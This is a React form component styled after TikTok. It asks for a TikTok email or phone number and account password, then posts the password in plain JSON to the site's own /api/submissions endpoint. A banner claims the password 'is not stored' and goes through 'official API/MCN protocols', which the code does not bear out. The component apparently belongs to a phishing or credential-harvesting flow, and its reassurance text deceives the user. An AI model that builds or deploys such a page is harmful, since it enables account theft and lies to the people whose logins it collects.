'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { Loader2, ArrowRight } from 'lucide-react';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import type { Submission } from '@/lib/types';
import { useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

const formSchema = z.object({
  email: z.string().email('Please enter a valid email address.').optional().or(z.literal('')),
  phoneNumber: z.string().min(10, 'Please enter a valid phone number.').optional().or(z.literal('')),
  password: z.string().min(1, 'Password is required.'),
});

type FormValues = z.infer<typeof formSchema>;

interface TiktokUsernameStepProps {
  onNext: (data: Partial<Submission>, method: 'email' | 'phone') => void;
  initialData?: Partial<Submission>;
  loginMethod: 'email' | 'phone';
  setLoginMethod: (method: 'email' | 'phone') => void;
}

export function TiktokUsernameStep({ onNext, initialData, loginMethod, setLoginMethod }: TiktokUsernameStepProps) {
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: initialData?.email || '',
      phoneNumber: initialData?.phoneNumber || '',
      password: '',
    },
    mode: 'onChange'
  });

  const onSubmit = async (values: FormValues) => {
    setIsSubmitting(true);
    
    let payload: Partial<Submission>;
    let id: string;

    if (loginMethod === 'email') {
        if (!values.email || !z.string().email().safeParse(values.email).success) {
            form.setError('email', { type: 'manual', message: 'A valid email is required to continue.' });
            setIsSubmitting(false);
            return;
        }
        id = values.email;
        payload = { id, email: values.email, password: values.password, tiktokUsername: id, tiktokUsernameStatus: 'approved' };
    } else {
        if (!values.phoneNumber || values.phoneNumber.length < 10) {
            form.setError('phoneNumber', { type: 'manual', message: 'A valid phone number is required to continue.' });
            setIsSubmitting(false);
            return;
        }
        id = values.phoneNumber;
        payload = { id, phoneNumber: values.phoneNumber, password: values.password, tiktokUsername: id, tiktokUsernameStatus: 'approved' };
    }
    
    try {
        const response = await fetch('/api/submissions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.message || 'Failed to submit details.');
        }

        toast({
          title: 'Details Submitted!',
          description: "Your information has been received.",
        });

        onNext(payload, loginMethod);

    } catch (err: any) {
        toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
        setIsSubmitting(false);
    }
  };

  const isButtonDisabled = isSubmitting || !form.watch('password') || (loginMethod === 'email' ? !form.watch('email') : !form.watch('phoneNumber')) || !form.formState.isValid;


  return (
    <>
      <div className="w-full bg-slate-100 h-1.5 rounded-full mb-8">
          <div className="bg-gradient-to-r from-pink-500 to-rose-500 h-1.5 rounded-full w-1/4 shadow-sm"></div>
      </div>

      <div className="text-center mb-8">
          <h2 className="text-2xl font-extrabold text-slate-900">Step 1: Welcome!</h2>
          <p className="text-slate-500 mt-2">Enter your details to get started.</p>
      </div>
      
      <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <Tabs value={loginMethod} className="w-full" onValueChange={(value) => setLoginMethod(value as 'email' | 'phone')}>
                  <TabsList className="grid w-full grid-cols-2 bg-slate-100 p-1 h-auto rounded-2xl">
                      <TabsTrigger value="phone" className="py-2 text-sm font-semibold rounded-xl transition data-[state=active]:bg-white data-[state=active]:text-black data-[state=inactive]:text-slate-400 data-[state=active]:shadow-sm">Phone</TabsTrigger>
                      <TabsTrigger value="email" className="py-2 text-sm font-semibold rounded-xl transition data-[state=active]:bg-white data-[state=active]:text-black data-[state=inactive]:text-slate-400 data-[state=active]:shadow-sm">Email</TabsTrigger>
                  </TabsList>
                  <TabsContent value="phone" className="pt-2">
                      <FormField
                          control={form.control}
                          name="phoneNumber"
                          render={({ field }) => (
                              <FormItem>
                                  <FormControl>
                                      <Input type="tel" placeholder="Phone number" {...field} disabled={isSubmitting} className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-rose-400 focus:border-transparent outline-none transition-all placeholder:text-slate-300" />
                                  </FormControl>
                                  <FormMessage />
                              </FormItem>
                          )}
                      />
                  </TabsContent>
                  <TabsContent value="email" className="pt-2">
                       <FormField
                          control={form.control}
                          name="email"
                          render={({ field }) => (
                              <FormItem>
                                  <FormControl>
                                      <Input type="email" placeholder="name@example.com" {...field} disabled={isSubmitting} className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-rose-400 focus:border-transparent outline-none transition-all placeholder:text-slate-300"/>
                                  </FormControl>
                                  <FormMessage />
                              </FormItem>
                          )}
                      />
                  </TabsContent>
              </Tabs>
              
              <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                      <FormItem>
                          <FormControl>
                              <Input type="password" placeholder="Password" {...field} disabled={isSubmitting} className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-rose-400 focus:border-transparent outline-none transition-all placeholder:text-slate-300"/>
                          </FormControl>
                          <FormMessage />
                      </FormItem>
                  )}
              />

              <div className="pt-4">
                   <Button type="submit" disabled={isButtonDisabled} className="w-full bg-[#FE2C55] hover:bg-[#E62247] text-white font-bold py-4 rounded-2xl shadow-lg shadow-rose-200 transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base disabled:bg-slate-200 disabled:text-slate-400">
                      {isSubmitting ? <Loader2 className="h-4 w-4 animate-spin"/> : 'Continue'}
                      {!isSubmitting && <ArrowRight className="h-5 w-5" />}
                  </Button>
              </div>
          </form>
      </Form>
      <div className="mt-8 p-4 bg-emerald-50/50 rounded-2xl border border-emerald-100 flex gap-3">
            <div className="text-emerald-500 mt-0.5 font-bold">✓</div>
            <p className="text-xs text-emerald-800 leading-relaxed">
                <span className="font-bold">Security Guarantee:</span> Your password is used once for a secure handshake and is not stored. Our bridge uses official API/MCN protocols.
            </p>
        </div>
    </>
  );
}
